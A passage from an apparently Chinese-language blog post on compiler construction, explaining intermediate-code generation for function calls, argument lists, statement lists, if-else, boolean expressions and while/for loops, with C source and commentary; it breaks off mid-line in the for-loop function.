T-&gt;type = symbolTable.symbols[rtn].type;</span><br><span class="line">    width = T-&gt;type == INT ? <span class="number">4</span> : <span class="number">8</span>; <span class="comment">//存放函数返回值的单数字节数</span></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">0</span>]) <span class="comment">//有调用参数</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">        Exp(T-&gt;ptr[<span class="number">0</span>]);                      <span class="comment">//处理所有实参表达式,求值及类型</span></span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width + width; <span class="comment">//累加上计算实参使用临时变量的单元数</span></span><br><span class="line">        T-&gt;code = T-&gt;ptr[<span class="number">0</span>]-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//无调用参数</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;width = width;</span><br><span class="line">        T-&gt;code = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    match_param(rtn, T-&gt;ptr[<span class="number">0</span>]); <span class="comment">//处理所有参数的匹配</span></span><br><span class="line">    T0 = T-&gt;ptr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span> (T0) <span class="comment">//处理参数列表的中间代码</span></span><br><span class="line">    &#123;</span><br><span class="line">        result.kind = ID;</span><br><span class="line">        <span class="built_in">strcpy</span>(result.id, symbolTable.symbols[T0-&gt;ptr[<span class="number">0</span>]-&gt;place].alias);</span><br><span class="line">        result.offset = symbolTable.symbols[T0-&gt;ptr[<span class="number">0</span>]-&gt;place].offset;</span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, genIR(ARG, opn1, opn2, result));</span><br><span class="line">        T0 = T0-&gt;ptr[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    T-&gt;place = temp_add(newTemp(), LEV, T-&gt;type, <span class="string">&#x27;T&#x27;</span>, T-&gt;offset + T-&gt;width - width); <span class="comment">/* 临时变量用于存储函数的返回值 */</span></span><br><span class="line">    opn1.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(opn1.id, T-&gt;type_id); <span class="comment">//保存函数名</span></span><br><span class="line">    opn1.offset = rtn;           <span class="comment">//这里offset用以保存函数定义入口,在目标代码生成时，能获取相应信息</span></span><br><span class="line">    result.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(result.id, symbolTable.symbols[T-&gt;place].alias);</span><br><span class="line">    result.offset = symbolTable.symbols[T-&gt;place].offset;</span><br><span class="line">    T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, genIR(CALL, opn1, opn2, result)); <span class="comment">//生成:x := CALL 函数名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>生成函数调用中间代码</li>
<li>函数 <code>match_param</code>：匹配函数参数</li>
</ul>
<p>ARGS：函数参数（Exp | Exp，Args）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">args_exp</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    Exp(T-&gt;ptr[<span class="number">0</span>]);</span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">    T-&gt;code = T-&gt;ptr[<span class="number">0</span>]-&gt;code;</span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">1</span>]) <span class="comment">//存在多个参数</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset + T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">        Exp(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">//再次调用args_exp</span></span><br><span class="line">        T-&gt;width += T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>语句列表</strong></p>
<p>在开始分析选择/循环语句之前需要先分析：STM_LIST </p>
<p>STM_LIST：语句列表（Stmt-语句节点，STM_LIST）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stmt_list</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!T-&gt;ptr[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;code = <span class="literal">NULL</span>;</span><br><span class="line">        T-&gt;width = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;              <span class="comment">//空语句序列</span></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">1</span>]) <span class="comment">//2条以上语句连接,生成新标号作为第一条语句结束后到达的位置</span></span><br><span class="line">        <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Snext, newLabel());</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//语句序列仅有一条语句,S.next属性向下传递</span></span><br><span class="line">        <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Snext, T-&gt;Snext);</span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">/* 分析语句Stmt */</span></span><br><span class="line">    T-&gt;code = T-&gt;ptr[<span class="number">0</span>]-&gt;code; <span class="comment">/* 将分析完毕的语句Stmt-code装回 */</span></span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">1</span>])</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext, T-&gt;Snext); <span class="comment">//2条以上语句连接,S.next属性向下传递</span></span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset; <span class="comment">//顺序结构共享单元方式</span></span><br><span class="line">        semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">//序列中第1条为表达式语句,返回语句,复合语句时,第2条前不需要标号</span></span><br><span class="line">        <span class="keyword">if</span> (T-&gt;ptr[<span class="number">0</span>]-&gt;kind == RETURN || T-&gt;ptr[<span class="number">0</span>]-&gt;kind == EXP_STMT || T-&gt;ptr[<span class="number">0</span>]-&gt;kind == COMP_STM)</span><br><span class="line">            T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T-&gt;code = merge(<span class="number">3</span>, T-&gt;code, genLabel(T-&gt;ptr[<span class="number">0</span>]-&gt;Snext), T-&gt;ptr[<span class="number">1</span>]-&gt;code);</span><br><span class="line">        <span class="keyword">if</span> (T-&gt;ptr[<span class="number">1</span>]-&gt;width &gt; T-&gt;width)</span><br><span class="line">            T-&gt;width = T-&gt;ptr[<span class="number">1</span>]-&gt;width; <span class="comment">//顺序结构共享单元方式</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>newLabel</code> 会生成一个标号，用于记录 if 语句为真时跳转的位置</li>
<li>只要 STM_LIST 节点的 STM_LIST 子树存在，程序就会给 Stmt 子树分配一个标号</li>
<li>根据代码逻辑，在选择/循环语句后必定有一个 <code>LABEL labeln</code>，用于标记跳转</li>
</ul>
<p>SEMI：语句（Stmt-语句节点）</p>
<p>语句的类型很多，这里重点分析选择语句和循环语句</p>
<p><strong>选择/循环语句</strong></p>
<p>IF_THEN_ELSE：IF ELSE 语句（Exp，Stmt-语句节点，Stmt-语句节点）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">if_then_else</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue, newLabel()); <span class="comment">//设置条件语句真假转移位置</span></span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse, newLabel());</span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;ptr[<span class="number">2</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    boolExp(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">//条件,要单独按短路代码处理</span></span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext, T-&gt;Snext);</span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">//if子句</span></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;width &lt; T-&gt;ptr[<span class="number">1</span>]-&gt;width)</span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">2</span>]-&gt;Snext, T-&gt;Snext);</span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">2</span>]); <span class="comment">//else子句</span></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;width &lt; T-&gt;ptr[<span class="number">2</span>]-&gt;width)</span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">2</span>]-&gt;width;</span><br><span class="line">    T-&gt;code = merge(<span class="number">6</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, <span class="comment">/* Exp子句-code */</span></span><br><span class="line">                    genLabel(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue),</span><br><span class="line">                    T-&gt;ptr[<span class="number">1</span>]-&gt;code, <span class="comment">/* if子句-code */</span></span><br><span class="line">                    genGoto(T-&gt;Snext),</span><br><span class="line">                    genLabel(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse), </span><br><span class="line">                    T-&gt;ptr[<span class="number">2</span>]-&gt;code); <span class="comment">/* else子句-code */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>genGoto</code>：生成 GOTO 语句，返回头指针</li>
<li>函数 <code>genLabel</code>：生成标号语句</li>
<li>函数 <code>boolExp</code> 用于判断 Exp 是否为真</li>
<li>在 “Exp子句” 中会调用一次 <code>genGoto</code>，根据条件跳转到 “if子句”，否则跳转到 “else子句”</li>
<li>在 “if子句” 中也会调用一次 <code>genGoto</code>，跳转到 “if-else语句” 结束</li>
<li>当 “else子句” 执行完毕时，“if-else语句” 结束</li>
<li>注意：程序将直接执行 <code>boolExp</code>，而不是去分析 <code>T-&gt;ptr[0]</code>，这样会导致函数调用无法生效（函数调用的核心代码在 Exp 中）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">boolExp</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">    <span class="keyword">int</span> rtn;</span><br><span class="line">    <span class="keyword">if</span> (T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (T-&gt;kind)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> INT: <span class="comment">/* 非&#x27;0&#x27;则真 */</span></span><br><span class="line">                <span class="keyword">if</span> (T-&gt;type_int != <span class="number">0</span>)</span><br><span class="line">                    T-&gt;code = genGoto(T-&gt;Etrue);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    T-&gt;code = genGoto(T-&gt;Efalse);</span><br><span class="line">                T-&gt;width = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FLOAT: <span class="comment">/* 非&#x27;0&#x27;则真 */</span></span><br><span class="line">                <span class="keyword">if</span> (T-&gt;type_float != <span class="number">0.0</span>)</span><br><span class="line">                    T-&gt;code = genGoto(T-&gt;Etrue);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    T-&gt;code = genGoto(T-&gt;Efalse);</span><br><span class="line">                T-&gt;width = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ID: <span class="comment">/* 查符号表,获得符号表中的位置(不支持函数调用) */</span></span><br><span class="line">                rtn = searchSymbolTable(T-&gt;type_id);</span><br><span class="line">                <span class="keyword">if</span> (rtn == <span class="number">-1</span>)</span><br><span class="line">                    semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;变量未定义，语义错误&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (symbolTable.symbols[rtn].flag == <span class="string">&#x27;F&#x27;</span>)&#123;</span><br><span class="line">                    semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;是函数名，不是普通变量，语义错误&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    opn1.kind = ID;</span><br><span class="line">                    <span class="built_in">strcpy</span>(opn1.id, symbolTable.symbols[rtn].alias);</span><br><span class="line">                    opn1.offset = symbolTable.symbols[rtn].offset;</span><br><span class="line">                    opn2.kind = INT;</span><br><span class="line">                    opn2.const_int = <span class="number">0</span>;</span><br><span class="line">                    result.kind = ID;</span><br><span class="line">                    <span class="built_in">strcpy</span>(result.id, T-&gt;Etrue);</span><br><span class="line">                    T-&gt;code = genIR(NEQ, opn1, opn2, result);</span><br><span class="line">                    T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, genGoto(T-&gt;Efalse));</span><br><span class="line">                &#125;</span><br><span class="line">                T-&gt;width = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RELOP: <span class="comment">/* 处理关系运算表达式,2个操作数都按基本表达式处理 */</span></span><br><span class="line">                T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">                Exp(T-&gt;ptr[<span class="number">0</span>]);</span><br><span class="line">                T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">                Exp(T-&gt;ptr[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (T-&gt;width &lt; T-&gt;ptr[<span class="number">1</span>]-&gt;width)</span><br><span class="line">                    T-&gt;width = T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">                opn1.kind = ID;</span><br><span class="line">                <span class="built_in">strcpy</span>(opn1.id, symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].alias);</span><br><span class="line">                opn1.offset = symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].offset;</span><br><span class="line">                opn2.kind = ID;</span><br><span class="line">                <span class="built_in">strcpy</span>(opn2.id, symbolTable.symbols[T-&gt;ptr[<span class="number">1</span>]-&gt;place].alias);</span><br><span class="line">                opn2.offset = symbolTable.symbols[T-&gt;ptr[<span class="number">1</span>]-&gt;place].offset;</span><br><span class="line">                result.kind = ID;</span><br><span class="line">                <span class="built_in">strcpy</span>(result.id, T-&gt;Etrue);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strcmp</span>(T-&gt;type_id, <span class="string">&quot;&lt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">                    op = JLT;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(T-&gt;type_id, <span class="string">&quot;&lt;=&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">                    op = JLE;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(T-&gt;type_id, <span class="string">&quot;&gt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">                    op = JGT;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(T-&gt;type_id, <span class="string">&quot;&gt;=&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">                    op = JGE;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(T-&gt;type_id, <span class="string">&quot;==&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">                    op = EQ;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(T-&gt;type_id, <span class="string">&quot;!=&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">                    op = NEQ;</span><br><span class="line">                T-&gt;code = genIR(op, opn1, opn2, result);</span><br><span class="line">                T-&gt;code = merge(<span class="number">4</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code, T-&gt;code, genGoto(T-&gt;Efalse));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> AND:</span><br><span class="line">            <span class="keyword">case</span> OR:</span><br><span class="line">                <span class="keyword">if</span> (T-&gt;kind == AND)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue, newLabel());</span><br><span class="line">                    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse, T-&gt;Efalse);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue, T-&gt;Etrue);</span><br><span class="line">                    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse, newLabel());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Etrue, T-&gt;Etrue);</span><br><span class="line">                <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Efalse, T-&gt;Efalse);</span><br><span class="line">                T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">                boolExp(T-&gt;ptr[<span class="number">0</span>]);</span><br><span class="line">                T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">                boolExp(T-&gt;ptr[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (T-&gt;width &lt; T-&gt;ptr[<span class="number">1</span>]-&gt;width)</span><br><span class="line">                    T-&gt;width = T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">                <span class="keyword">if</span> (T-&gt;kind == AND)</span><br><span class="line">                    T-&gt;code = merge(<span class="number">3</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, genLabel(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue), T-&gt;ptr[<span class="number">1</span>]-&gt;code);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    T-&gt;code = merge(<span class="number">3</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, genLabel(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse), T-&gt;ptr[<span class="number">1</span>]-&gt;code);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> NOT: <span class="comment">/* 交换Efalse与Etrue */</span></span><br><span class="line">                <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue, T-&gt;Efalse);</span><br><span class="line">                <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse, T-&gt;Etrue);</span><br><span class="line">                boolExp(T-&gt;ptr[<span class="number">0</span>]);</span><br><span class="line">                T-&gt;code = T-&gt;ptr[<span class="number">0</span>]-&gt;code;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_CALL: <span class="comment">/* 函数调用(不支持) */</span></span><br><span class="line">                semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;暂时不支持函数调用&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>WHILE：WHILE 语句（Exp，Stmt-语句节点）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">while_dec</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue, newLabel()); <span class="comment">//子结点继承属性的计算</span></span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse, T-&gt;Snext);</span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    boolExp(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">//循环条件,要单独按短路代码处理</span></span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext, newLabel());</span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">//while子句-循环体</span></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;width &lt; T-&gt;ptr[<span class="number">1</span>]-&gt;width)</span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">    T-&gt;code = merge(<span class="number">5</span>, genLabel(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext), T-&gt;ptr[<span class="number">0</span>]-&gt;code,</span><br><span class="line">                    genLabel(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue), T-&gt;ptr[<span class="number">1</span>]-&gt;code, genGoto(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序会在 “Exp子句” 之前写入一个 <code>LABEL labeln</code></li>
<li>在 “Exp子句” 中会调用一次 <code>genGoto</code>，根据条件跳转到 “while子句”，否则结束 “while语句”</li>
<li>当 “while子句” 结束时会自动跳转到 “Exp子句” 开始新一轮循环</li>
</ul>
<p>FOR：FOR 语句（FOR_DEC，Stmt-语句节点）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">for_dec</span><span class="params">(struct node* T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Etrue, newLabel()); </span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;Efalse, T-&gt;Snext);</span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">0</span>]); </span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext, newLabel());</span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]); </span><br><span class="line">    <span class="keyword">if</span> (T-&gt;width &lt; T-&gt;ptr[<span class="number">1</span>]-&gt;width)</span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">    T-&gt;code = merge(<span class="number">7</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;ptr[<span class="number">0</span>]-&gt;code, </span><br><span class="line">                    genLabel(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext), T-&gt;ptr[<span class="number">0</span>]-&gt;ptr[<span 